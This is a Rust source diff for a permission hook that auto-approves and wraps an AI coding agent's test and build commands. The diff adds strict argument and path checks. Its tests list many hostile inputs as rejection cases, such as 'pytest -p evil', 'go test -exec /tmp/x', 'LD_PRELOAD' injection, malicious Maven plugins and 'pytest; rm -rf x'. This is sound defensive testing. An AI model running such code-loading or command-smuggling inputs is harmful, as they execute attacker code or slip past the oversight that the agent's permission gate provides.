+        if let Some(s) = self.short.iter().find(|s| body.starts_with(**s)) {
+            return Some((*s, glued(&body[s.len()..])));
+        }
+        if self.bundled {
+            for (at, c) in body.char_indices() {
+                if let Some(s) = self.short.iter().find(|s| s.len() == 1 && s.starts_with(c)) {
+                    return Some((*s, glued(&body[at + c.len_utf8()..])));
+                }
+            }
+        }
+        None
+    }
+
+    fn long_hit<'a>(&self, body: &'a str) -> Option<(&'static str, Option<&'a str>)> {
+        let (name, value) = match body.split_once('=') {
+            Some((n, v)) => (n, Some(v)),
+            None => (body, None),
+        };
+        let name = norm(name);
+        if name.is_empty() {
+            return None; // `--`: end of options
+        }
+        let long = self
+            .long
+            .iter()
+            .find(|d| **d == name || (self.abbrev && d.starts_with(&name)));
+        let contains = || self.long_contains.iter().find(|d| name.contains(**d));
+        long.or_else(contains).map(|d| (*d, value))
+    }
+}
+
+/// Option-name normalization: case and `-`/`_` don't distinguish options
+/// for any tool here (yargs/cac accept both camel and kebab case).
+fn norm(name: &str) -> String {
+    name.chars()
+        .filter(|c| *c != '-' && *c != '_')
+        .map(|c| c.to_ascii_lowercase())
+        .collect()
+}
+
+/// dotnet: no MSBuild response files (`@x.rsp`), no inline runsettings
+/// after `--`, and none of `DOTNET_DENY` in any `-x`/`--x`/`/x` spelling.
+fn dotnet_args_ok(args: &[&str]) -> bool {
+    args.iter().all(|a| {
+        if *a == "--" || a.starts_with('@') {
+            return false;
+        }
+        let body = a
+            .strip_prefix("--")
+            .or_else(|| a.strip_prefix('-'))
+            .or_else(|| a.strip_prefix('/'));
+        let Some(body) = body else {
+            return true;
+        };
+        let name = body.split([':', '=']).next().unwrap_or(body);
+        !DOTNET_DENY.contains(&norm(name).as_str())
+    })
+}
+
+/// An upper-case `NAME=value` (or `NAME[sdk=*]=value`) argument to
+/// xcodebuild is a build setting; only `XCODE_SAFE_SETTINGS` may be set.
+fn xcode_setting_ok(a: &str) -> bool {
+    let Some((lhs, _)) = a.split_once('=') else {
+        return true;
+    };
+    let name = lhs.split('[').next().unwrap_or(lhs);
+    let is_setting = !name.is_empty()
+        && !name.starts_with(|c: char| c.is_ascii_digit())
+        && name
+            .chars()
+            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');
+    !is_setting || XCODE_SAFE_SETTINGS.contains(&name)
+}
+
+/// No token may climb out of the project (`..` path component) or name an
+/// absolute path outside `root`. Absolute paths are found at the start of a
+/// token and after `=`, `:`, `,` or a space (`--x=/p`, `a:/p`, quoted
+/// lists). `root` None → no absolute path is accepted. Lexical only.
+fn paths_ok(toks: &[&str], root: Option<&Path>) -> bool {
+    toks.iter().all(|t| {
+        if t.split(['/', '=', ':', ',', ' ']).any(|p| p == "..") {
+            return false;
+        }
+        let bytes = t.as_bytes();
+        t.char_indices()
+            .filter(|(at, c)| {
+                *c == '/' && (*at == 0 || matches!(bytes[at - 1], b'=' | b':' | b',' | b' '))
+            })
+            .all(|(at, _)| {
+                let p = &t[at..];
+                let p = &p[..p.find([':', ',', ' ']).unwrap_or(p.len())];
+                root.is_some_and(|r| Path::new(p).starts_with(r))
+            })
     })
 }
 
@@ -476,7 +1213,8 @@ fn matches_wrap_script(first: &str, next: Option<&str>, wrap_scripts: &[String])
     wrap_scripts.iter().any(|s| basename(s) == basename(target))
 }
 
-fn is_noisy(base: &str, next: Option<&str>) -> bool {
+fn is_noisy(base: &str, rest: &[&str]) -> bool {
+    let next = rest.first().copied();
     if ALWAYS.contains(&base) {
         return true;
     }
@@ -484,6 +1222,11 @@ fn is_noisy(base: &str, next: Option<&str>) -> bool {
         return next
             .map(|n| n.rsplit('/').next().unwrap_or(n))
             .is_some_and(|n| RUNNER_TOOLS.contains(&n));
+    }
+    // `npm run test` / `pnpm run test` / `yarn run test`: the test script
+    // only, never `run <any script>`.
+    if matches!(base, "npm" | "pnpm" | "yarn") && next == Some("run") {
+        return rest.get(1) == Some(&"test");
     }
     if let Some((_, subs)) = SUBCOMMAND.iter().find(|(c, _)| *c == base) {
         return next.is_some_and(|n| subs.contains(&n));
@@ -501,16 +1244,14 @@ fn is_noisy(base: &str, next: Option<&str>) -> bool {
 
 /// True when a `uv`/`uvx` command runs an allowlisted noisy tool
 /// (`uv run pytest`, `uvx ruff check`, `uv run -m pytest`,
-/// `uv run python -m pytest`). Skips only known-safe boolean uv flags between
-/// the prefix and the command; a value flag, an unknown flag, or a bare
-/// `uv pip|sync|add|build|…` makes it return false so the hook leaves the
-/// command alone (no surprise auto-approval). Mirrors the inner allowlist so a
-/// uv-wrapped run gets the same treatment as the bare tool.
+/// `uv run python -m pytest`) whose arguments pass `args_ok`. Skips only
+/// known-safe boolean uv flags between the prefix and the command; a value
+/// flag, an unknown flag, or a bare `uv pip|sync|add|build|…` makes it return
+/// false so the hook leaves the command alone (no surprise auto-approval).
+/// Mirrors the inner allowlist so a uv-wrapped run gets the same treatment as
+/// the bare tool.
 fn uv_wraps_noisy(argv: &[String]) -> bool {
-    let base0 = argv
-        .first()
-        .map(|s| s.rsplit('/').next().unwrap_or(s))
-        .unwrap_or("");
+    let base0 = argv.first().map(|s| basename(s)).unwrap_or("");
     let next = |i: usize| argv.get(i).map(String::as_str);
     let after_prefix: &[String] = match base0 {
         "uvx" => &argv[1..],
@@ -534,32 +1275,43 @@ fn uv_wraps_noisy(argv: &[String]) -> bool {
             return false; // value/unknown flag: don't auto-approve
         }
     }
-    let base = rest
-        .first()
-        .map(|s| s.rsplit('/').next().unwrap_or(s))
-        .unwrap_or("");
-    if has_mutating_token(base, rest.get(1..).unwrap_or(&[])) {
+    let rest: Vec<&str> = rest.iter().map(String::as_str).collect();
+    let Some((cmd, args)) = rest.split_first() else {
+        return false;
+    };
+    let base = basename(cmd);
+    if has_mutating_token(base, args) {
         return false;
     }
-    is_noisy(base, rest.get(1).map(String::as_str))
-}
-
-/// Split on top-level shell connectors. Coarse (quotes not honored), but
-/// errs toward NOT wrapping: a connector inside quotes only adds segments
-/// whose first words are unlikely to hit the allowlist.
-fn split_segments(cmd: &str) -> Vec<&str> {
-    cmd.split("&&")
-        .flat_map(|s| s.split("||"))
-        .flat_map(|s| s.split(';'))
-        .flat_map(|s| s.split('|'))
-        .map(str::trim)
-        .filter(|s| !s.is_empty())
-        .collect()
+    is_noisy(base, args) && args_ok(base, args)
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn package_test_script_forms_and_mvnw_wrap_but_other_scripts_do_not() {
+        for c in [
+            "npm run test",
+            "npm t",
+            "pnpm run test",
+            "yarn run test -t x",
+            "./mvnw test",
+        ] {
+            assert!(wrap_command(c).is_some(), "{c}");
+        }
+        for c in [
+            "npm run deploy",
+            "npm run",
+            "pnpm run build",
+            "npm run test -- --config /tmp/x.js",
+            "./mvnw org.evil:plugin:1:run",
+            "golangci-lint run",
+        ] {
+            assert!(wrap_command(c).is_none(), "{c}");
+        }
+    }
 
     #[test]
     fn env_prefix_only_benign_names_are_auto_wrapped() {
@@ -631,7 +1383,7 @@ mod tests {
     fn wraps_noisy_simple_command() {
         assert_eq!(
             wrap_command("pytest -q tests/").as_deref(),
-            Some("cartoon -c 'pytest -q tests/'")
+            Some("cartoon --merge-streams -c 'pytest -q tests/'")
         );
     }
 
@@ -639,7 +1391,7 @@ mod tests {
     fn wraps_compound_only_when_every_segment_noisy() {
         assert_eq!(
             wrap_command("cargo build --release && cargo test").as_deref(),
-            Some("cartoon -c 'cargo build --release && cargo test'")
+            Some("cartoon --merge-streams -c 'cargo build --release && cargo test'")
         );
         // one non-allowlisted segment poisons the whole compound: a rewrite
         // auto-approves, so nothing may ride along
@@ -659,7 +1411,7 @@ mod tests {
     fn policy_matches_declared_project_script_and_forces_deny() {
         let (wrapped, force_deny) =
             wrap_command_with_policy("./build.sh -d", &["./build.sh".to_string()]).unwrap();
-        assert_eq!(wrapped, "cartoon -c './build.sh -d'");
+        assert_eq!(wrapped, "cartoon --merge-streams -c './build.sh -d'");
         assert!(force_deny, "a project script must never be auto-approved");
     }
 
@@ -673,7 +1425,10 @@ mod tests {
         let (wrapped, force_deny) =
             wrap_command_with_policy("./build.sh -d && pytest -q", &["./build.sh".to_string()])
                 .unwrap();
-        assert_eq!(wrapped, "cartoon -c './build.sh -d && pytest -q'");
+        assert_eq!(
+            wrapped,
+            "cartoon --merge-streams -c './build.sh -d && pytest -q'"
+        );
         assert!(force_deny);
     }
 
@@ -723,7 +1478,7 @@ mod tests {
         let v: Value = serde_json::from_str(&out).unwrap();
         assert_eq!(
             v["hookSpecificOutput"]["updatedInput"]["command"],
-            "cartoon -c 'pytest -q'"
+            "cartoon --merge-streams -c 'pytest -q'"
         );
     }
 
@@ -766,7 +1521,7 @@ mod tests {
     fn uv_run_noisy_tools_wrapped() {
         assert_eq!(
             wrap_command("uv run pytest tests -v").as_deref(),
-            Some("cartoon -c 'uv run pytest tests -v'")
+            Some("cartoon --merge-streams -c 'uv run pytest tests -v'")
         );
         assert!(wrap_command("uvx pytest").is_some());
         assert!(wrap_command("uv tool run pytest").is_some());
@@ -786,14 +1541,17 @@ mod tests {
     fn env_prefix_does_not_hide_noisy_command() {
         assert_eq!(
             wrap_command("CI=1 pytest -x").as_deref(),
-            Some("cartoon -c 'CI=1 pytest -x'")
+            Some("cartoon --merge-streams -c 'CI=1 pytest -x'")
         );
     }
 
     #[test]
     fn single_quotes_escaped() {
         let w = wrap_command("pytest -k 'not slow'").unwrap();
-        assert_eq!(w, r#"cartoon -c 'pytest -k '\''not slow'\'''"#);
+        assert_eq!(
+            w,
+            r#"cartoon --merge-streams -c 'pytest -k '\''not slow'\'''"#
+        );
     }
 
     #[test]
@@ -817,7 +1575,10 @@ mod tests {
         let hso = &v["hookSpecificOutput"];
         assert_eq!(hso["hookEventName"], "PreToolUse");
         assert_eq!(hso["permissionDecision"], "allow");
-        assert_eq!(hso["updatedInput"]["command"], "cartoon -c 'pytest -q'");
+        assert_eq!(
+            hso["updatedInput"]["command"],
+            "cartoon --merge-streams -c 'pytest -q'"
+        );
         assert_eq!(hso["updatedInput"]["timeout"], 5000);
     }
 
@@ -834,7 +1595,7 @@ mod tests {
         assert!(hso["permissionDecisionReason"]
             .as_str()
             .unwrap()
-            .contains("cartoon -c './build.sh -d'"));
+            .contains("cartoon --merge-streams -c './build.sh -d'"));
     }
 
     #[test]
@@ -866,7 +1627,10 @@ mod tests {
         let v: Value = serde_json::from_str(&out).unwrap();
         let hso = &v["hookSpecificOutput"];
         assert_eq!(hso["permissionDecision"], "allow");
-        assert_eq!(hso["updatedInput"]["command"], "cartoon -c 'pytest -q'");
+        assert_eq!(
+            hso["updatedInput"]["command"],
+            "cartoon --merge-streams -c 'pytest -q'"
+        );
         // unrelated fields preserved
         assert_eq!(hso["updatedInput"]["description"], "tests");
     }
@@ -896,7 +1660,7 @@ mod tests {
         assert!(hso["permissionDecisionReason"]
             .as_str()
             .unwrap()
-            .contains("cartoon -c 'pytest -q'"));
+            .contains("cartoon --merge-streams -c 'pytest -q'"));
     }
 
     #[test]
@@ -982,5 +1746,517 @@ mod tests {
         assert!(wrap_command("npx jest src/").is_some());
         assert!(wrap_command("npx vitest run").is_some());
         assert!(wrap_command("npx cowsay moo").is_none());
+    }
+
+    // ---- argument policy (review 2026-10-02 §3.1) ----
+
+    #[test]
+    fn code_loading_flags_are_never_auto_approved() {
+        for cmd in [
+            // go: build/test helpers that exec a binary
+            "go test -exec /tmp/x ./...",
+            "go test -exec=x ./...",
+            "go test --exec x ./...",
+            "go test -toolexec x ./...",
+            "go build -overlay o.json ./...",
+            "go vet -modfile=x.mod ./...",
+            "go vet -vettool=x ./...",
+            "go build -ldflags=-extld=x ./...",
+            "go test -gcflags all=-N ./...",
+            "go test -C sub ./...",
+            // cargo: config, unstable flags, toolchain override
+            "cargo test --config build.rustc-wrapper=x",
+            "cargo test --config=build.rustc-wrapper=x",
+            "cargo build -Zbuild-std",
+            "cargo build -Z build-std",
+            "cargo test -qZunstable-options",
+            "cargo test +nightly",
+            "cargo nextest self update",
+            "cargo nextest run --tool-config-file x.toml",
+            // make: other makefile/dir/includes/eval, any variable override
+            "make -f x.mk",
+            "make -fx.mk test",
+            "make -kf x.mk",
+            "make --file=x.mk",
+            "make --makefile x.mk",
+            "make --fil=x.mk",
+            "make -C sub",
+            "make --directory=sub",
+            "make -I inc",
+            "make --include-dir=inc",
+            "make --eval=x",
+            "make -E x",
+            "make SHELL=x",
+            "make test MAKE=x",
+            "make CC=x test",
+            "make 'SHELL=x'",
+            // jest / vitest / package-manager test scripts
+            "jest --config j.js",
+            "jest --config=j.js",
+            "jest -c j.js",
+            "jest -ic j.js",
+            "jest --setupFiles s.js",
+            "jest --setup-files-after-env s.js",
+            "jest --setupFilesAfterEnv=s.js",
+            "jest --globalSetup g.js",
+            "jest --global-teardown g.js",
+            "jest --testRunner r.js",
+            "jest --runner r.js",
+            "jest --transform x",
+            "jest --resolver r.js",
+            "jest --env x",
+            "jest --testEnvironment x",
+            "jest --reporters ./r.js",
+            "jest --testResultsProcessor p.js",
+            "jest --watchPlugins p.js",
+            "jest --projects p",
+            "jest --rootDir r",
+            "vitest run --config v.ts",
+            "vitest run -c v.ts",
+            "vitest run --environment x",
+            "vitest run --reporter=./r.js",
+            "vitest run --coverage.customProviderModule=x",
+            "vitest run --pool ./pool.js",
+            "vitest run --api",
+            "vitest run --ui",
+            "vitest run --root r",
+            "npx jest --config j.js",
+            "npx vitest run --setupFiles s.ts",
+            "npm test -- --config j.js",
+            "npm test --script-shell=x",
+            "pnpm test --config j.js",
+            "yarn test -c j.js",
+            "bun test --preload p.ts",
+            "bun test -r p.ts",
+            "npm ci --registry=https:x",
+            "npm ci --prefix sub",
+            // eslint
+            "eslint -cx.js src/",
+            "eslint --config=x.js src/",
+            "eslint --plugin x src/",
+            "eslint --parser x src/",
+            "eslint --resolve-plugins-relative-to x src/",
+            // mypy (argparse abbreviations included)
+            "mypy --config-file x.ini src",
+            "mypy --config-file=x.ini src",
+            "mypy --config-f=x.ini src",
+            "mypy --python-executable x src",
+            "mypy --python-exec=x src",
+            "mypy --install-types src",
+            "uv run mypy --config-file x.ini src",
+            // pytest
+            "pytest -p evil",
+            "pytest -pevil",
+            "pytest -qp evil",
+            "pytest -c x.ini",
+            "pytest -cx.ini",
+            "pytest --confcutdir=x",
+            "pytest --rootdir x",
+            "pytest --override-ini=addopts=-pevil",
+            "pytest -o addopts=-pevil",
+            "pytest -oaddopts=x",
+            "pytest --basetemp=src",
+            "pytest --pdbcls=x:Y",
+            "pytest --tx popen//python=x",
+            "pytest --cov-config=x",
+            "python -m pytest -p evil",
+            "python3 -m pytest -c x.ini",
+            "uv run pytest -p evil",
+            "uv run -m pytest -p evil",
+            "uv run python -m pytest -c x.ini",
+            // phpunit
+            "phpunit --bootstrap b.php",
+            "phpunit --bootstrap=b.php",
+            "phpunit -c x.xml",
+            "phpunit --configuration x.xml",
+            "phpunit --conf=x.xml",
+            "phpunit -d auto_prepend_file=x.php",
+            "phpunit -dauto_prepend_file=x.php",
+            "phpunit --include-path x",
+            "phpunit --extension X",
+            // rspec
+            "rspec -r x.rb",
+            "rspec -rx",
+            "rspec --require x",
+            "rspec --req x",
+            "rspec -I lib",
+            "rspec -Ilib",
+            "rspec --options x",
+            // gradle / gradlew
+            "gradle test -I init.gradle",
+            "gradle test --init-script init.gradle",
+            "gradle test --init-script=init.gradle",
+            "./gradlew test -c s.gradle",
+            "./gradlew test --settings-file s.gradle",
+            "./gradlew build -b b.gradle",
+            "./gradlew build --build-file b.gradle",
+            "gradle test -Dorg.gradle.java.home=x",
+            "gradle test -Px=y",
+            "gradle test --gradle-user-home x",
+            "gradle test --include-build x",
+            // mvn
+            "mvn test -s s.xml",
+            "mvn test --settings s.xml",
+            "mvn test -gs s.xml",
+            "mvn test -f other.xml",
+            "mvn test --file=other.xml",
+            "mvn test -t t.xml",
+            "mvn test -Dmaven.ext.class.path=x.jar",
+            "mvn test --define maven.ext.class.path=x.jar",
+            "mvn test org.evil:plugin:1.0:run",
+            // dotnet
+            "dotnet test -p:VSTestTestAdapterPath=x",
+            "dotnet build -property:CscToolPath=x",
+            "dotnet build --property:X=y",
+            "dotnet build @x.rsp",
+            "dotnet test --logger x",
+            "dotnet test -l x",
+            "dotnet test --settings x.runsettings",
+            "dotnet test --test-adapter-path x",
+            "dotnet test -e LD_PRELOAD=x",
+            "dotnet test -- RunConfiguration.TestAdaptersPaths=x",
+            "dotnet build --source https:x",
+            // swift
+            "swift build -Xswiftc -load-plugin-executable",
+            "swift test -Xlinker x",
+            "swift build --toolchain x",
+            "swift build --disable-sandbox",
+            "swift build --scratch-path x",
+            "swift test --package-path=x",
+            // xcodebuild
+            "xcodebuild test -scheme A -xcconfig x.xcconfig",
+            "xcodebuild test -scheme A -toolchain x",
+            "xcodebuild test -scheme A CC=x",
+            "xcodebuild build -scheme A SWIFT_EXEC=x",
+            "xcodebuild test -scheme A -skipMacroValidation",
+            "xcodebuild test -xctestrun x.xctestrun",
+            // pre-commit
+            "pre-commit -c x.yaml run",
+            "pre-commit run -c x.yaml",
+            "pre-commit run --config=x.yaml",
+            "pre-commit install",
+            "pre-commit autoupdate",
+            "pre-commit try-repo https:x",
+            // env vars that inject flags
+            "PYTEST_ADDOPTS=-pevil pytest",
+            "JEST_CONFIG=x jest",
+        ] {
+            assert!(
+                wrap_command(cmd).is_none(),
+                "{cmd} must not be auto-wrapped"
+            );
+        }
+    }
+
+    #[test]
+    fn paths_outside_the_project_are_never_auto_approved() {
+        let root = Path::new("/proj");
+        let at = |cmd: &str| wrap_command_in(cmd, &[], Some(root)).map(|(w, _)| w);
+        for cmd in [
+            "/tmp/x/pytest",
+            "/usr/bin/make test",
+            "../other/node_modules/.bin/jest",
+            "pytest /tmp/evil_test.py",
+            "pytest ../other/tests",
+            "pytest --junitxml=/tmp/r.xml",
+            "cargo test --manifest-path ../x/Cargo.toml",
+            "cargo test --manifest-path=/tmp/x/Cargo.toml",
+            "cargo build --target-dir /tmp/t",
+            "tsc -p /tmp/tsconfig.json",
+            "tsc -p ../x",
+            "go test ../...",
+            "go build -o /usr/local/bin/x ./...",
+            "eslint -f /tmp/fmt.js src/",
+            "CI=/tmp/x pytest",
+            "pytest -k 'a /tmp/x'",
+            "/projector/bin/pytest",
+        ] {
+            assert!(at(cmd).is_none(), "{cmd} must not be auto-wrapped");
+        }
+        // Inside the project root: fine.
+        for cmd in [
+            "/proj/.venv/bin/pytest -q",
+            "pytest /proj/tests/test_a.py",
+            "cargo test --manifest-path /proj/sub/Cargo.toml",
+            "tsc -p /proj/tsconfig.json",
+            "go test ./...",
+        ] {
+            assert!(at(cmd).is_some(), "{cmd} should be auto-wrapped");
+        }
+        // No root known: no absolute path at all.
+        assert!(wrap_command("pytest /proj/tests").is_none());
+    }
+
+    #[test]
+    fn decision_uses_event_cwd_as_project_root() {
+        let input =
+            r#"{"tool_name":"Bash","cwd":"/proj","tool_input":{"command":"pytest /proj/t.py"}}"#;
+        assert!(rewrite_decision(input, false).is_some());
+        let input =
+            r#"{"tool_name":"Bash","cwd":"/proj","tool_input":{"command":"pytest /tmp/t.py"}}"#;
+        assert!(rewrite_decision(input, false).is_none());
+    }
+
+    #[test]
+    fn benign_dev_loop_forms_still_wrap() {
+        for cmd in [
+            "pytest",
+            "pytest -q tests/",
+            "pytest -x -vv --tb=short tests/test_a.py::TestX::test_y",
+            "pytest -k 'not slow' -m \"unit or fast\"",
+            "pytest -k 'test_x[param-1]'",
+            "pytest -p no:cacheprovider -q",
+            "pytest -pno:randomly",
+            "pytest -n auto --lf --ff",
+            "pytest -ra",
+            "pytest --co -q",
+            "python -m pytest -q",
+            "python3 -m unittest discover -s tests",
+            "uv run pytest tests -v",
+            "uv run -m pytest -x",
+            "CI=1 NO_COLOR=1 pytest -q",
+            "cargo test",
+            "cargo test -q --workspace -- --nocapture",
+            "cargo test -p mycrate --features x,y",
+            "cargo clippy --all-targets -- -D warnings",
+            "cargo build --release && cargo test",
+            "cargo nextest run",
+            "cargo nextest list",
+            "cargo doc --no-deps",
+            "go test ./...",
+            "go test -race -count=1 -run TestX ./pkg/...",
+            "go test -v -json ./...",
+            "go build ./...",
+            "go vet ./...",
+            "make",
+            "make -j4",
+            "make test",
+            "make -k -j8 check",
+            "jest",
+            "jest src/ -t 'renders ok'",
+            "jest --coverage --ci --silent",
+            "npx jest --runInBand",
+            "vitest run",
+            "vitest run --reporter=verbose",
+            "vitest run --reporter dot src/",
+            "vitest run --pool=forks",
+            "npx vitest run -t foo",
+            "npm test",
+            "npm test -- -u",
+            "npm ci",
+            "npm ci --no-audit --no-fund",
+            "pnpm test",
+            "yarn test --watchAll=false",
+            "bun test",
+            "tsc --noEmit",
+            "npx tsc -p tsconfig.build.json",
+            "eslint src/",
+            "eslint -f json src/",
+            "mypy src",
+            "mypy --strict --python-version 3.11 src",
+            "ruff check .",
+            "uvx ruff check src",
+            "phpunit",
+            "phpunit --filter testFoo tests/",
+            "rspec",
+            "rspec spec/models -fd",
+            "gradle test",
+            "./gradlew test --tests 'com.x.FooTest'",
+            "./gradlew build --offline",
+            "mvn test",
+            "mvn verify -q -DskipTests",
+            "mvn test -Dtest=FooTest",
+            "mvn package -B -ntp -fae",
+            "dotnet test",
+            "dotnet build -c Release",
+            "dotnet test --filter Category=Unit --no-build",
+            "swift test",
+            "swift build -c release",
+            "swift test --filter MyTests",
+            "xcodebuild test -scheme App -destination 'platform=iOS Simulator,name=iPhone 15'",
+            "xcodebuild build -scheme App CODE_SIGNING_ALLOWED=NO",
+            "xcrun xcodebuild test -scheme A",
+            "pre-commit run --all-files",
+            "pre-commit run ruff --files a.py",
+            "pre-commit",
+            "swiftlint",
+            "./node_modules/.bin/jest src/",
+        ] {
+            assert!(wrap_command(cmd).is_some(), "{cmd} should still wrap");
+        }
+    }
+
+    #[test]
+    fn lexer_rejects_anything_it_cannot_prove_inert() {
+        for cmd in [
+            "pytest; rm -rf x",
+            "pytest | tail -5",
+            "pytest || true",
+            "pytest & cargo test",
+            "pytest &&& cargo test",
+            "pytest && && cargo test",
+            "pytest &&",
+            "&& pytest",
+            "pytest $HOME",
+            "pytest ${X}",
+            "pytest \"$X\"",
+            "pytest \"`id`\"",
+            "pytest 'a\\b'",
+            "pytest a\\ b",
+            "pytest tests/*.py",
+            "pytest test_?.py",
+            "pytest test_[ab].py",
+            "pytest {a,b}",
+            "pytest ~/x",
+            "pytest # comment",
+            "pytest !x",
+            "pytest\t-q",
+            "pytest -k é",
+            "pytest 'unbalanced",
+            "pytest \"it's\"",
+            "pytest 'say \"hi\"'",
+            "pytest \"a!b\"",
+            "'CI=1' pytest",
+            "'pytest' -q",
+            "CI='1' pytest",
+        ] {
+            assert!(
+                wrap_command(cmd).is_none(),
+                "{cmd:?} must not be auto-wrapped"
+            );
+        }
+        // Quoted operators are literal: still one segment, still fine.
+        assert!(wrap_command("pytest -k 'a && b; c | d > e'").is_some());
+    }
+
+    /// The rewrite must mean exactly what the agent asked: the original
+    /// command, single-quoted for `cartoon -c`, with nothing unquoted that a
+    /// shell would treat as syntax other than the supported `&&`.
+    fn assert_inert_rewrite(cmd: &str, wrapped: &str) {
+        let trimmed = cmd.trim();
+        assert_eq!(
+            wrapped,
+            format!(
+                "cartoon --merge-streams -c '{}'",
+                trimmed.replace('\'', r"'\''")
+            ),
+            "{cmd:?}"
+        );
+        assert_eq!(
+            shell_words::split(wrapped).unwrap(),
+            vec![
+                "cartoon".to_string(),
+                "--merge-streams".into(),
+                "-c".into(),
+                trimmed.into()
+            ],
+            "{cmd:?}"
+        );
+        let mut quote = None;
+        let mut chars = trimmed.chars().peekable();
+        while let Some(c) = chars.next() {
+            assert!(c.is_ascii() && !c.is_ascii_control(), "{cmd:?}");
+            assert!(!"$`\\!".contains(c), "{cmd:?}");
+            match quote {
+                Some(q) if c == q => quote = None,
+                Some(_) => {}
+                None if c == '\'' || c == '"' => quote = Some(c),
+                None if c == '&' => assert_eq!(chars.next(), Some('&'), "{cmd:?}"),
+                None => assert!(!";|<>*?[]{}~#()".contains(c), "{cmd:?}"),
+            }
+        }
+        assert!(quote.is_none(), "{cmd:?}");
+    }
+
+    #[test]
+    fn property_rewrites_are_inert_and_meaning_preserving() {
+        const HEADS: &[&str] = &[
+            "pytest",
+            "cargo test",
+            "make",
+            "jest",
+            "go test",
+            "CI=1 pytest",
+            "npx jest",
+            "uv run pytest",
+            "mvn test",
+            "",
+        ];
+        const PIECES: &[&str] = &[
+            " ",
+            " ",
+            " ",
+            "-q",
+            "-x",
+            "x",
+            "tests/",
+            "&&",
+            "&&",
+            " && pytest",
+            "&",
+            ";",
+            "|",
+            "||",
+            "$",
+            "$(",
+            "`",
+            ">",
+            "<",
+            "'",
+            "'",
+            "\"",
+            "\"",
+            "\\",
+            "\n",
+            "\t",
+            "*",
+            "?",
+            "[",
+            "]",
+            "{",
+            "}",
+            "~",
+            "#",
+            "!",
+            "=",
+            "CI=1",
+            "/",
+            "..",
+            "%",
+            "+",
+            "@",
+            ":",
+            ",",
+            "(",
+            ")",
+            "é",
+            "a b",
+            "-k",
+            "not slow",
+            "-c",
+            "-p",
+            "no:x",
+            "cartoon",
+        ];
+        let mut state: u64 = 0x9E37_79B9_7F4A_7C15;
+        let mut next = move || {
+            state ^= state << 13;
+            state ^= state >> 7;
+            state ^= state << 17;
+            state
+        };
+        let mut wrapped = 0;
+        for _ in 0..100_000 {
+            let mut cmd = HEADS[(next() % HEADS.len() as u64) as usize].to_string();
+            for _ in 0..next() % 8 {
+                cmd.push_str(PIECES[(next() % PIECES.len() as u64) as usize]);
+            }
+            if let Some(w) = wrap_command(&cmd) {
+                wrapped += 1;
+                assert_inert_rewrite(&cmd, &w);
+            }
+        }
+        // The generator must actually exercise the accept path.
+        assert!(wrapped > 1_000, "only {wrapped} accepted");
     }
 }
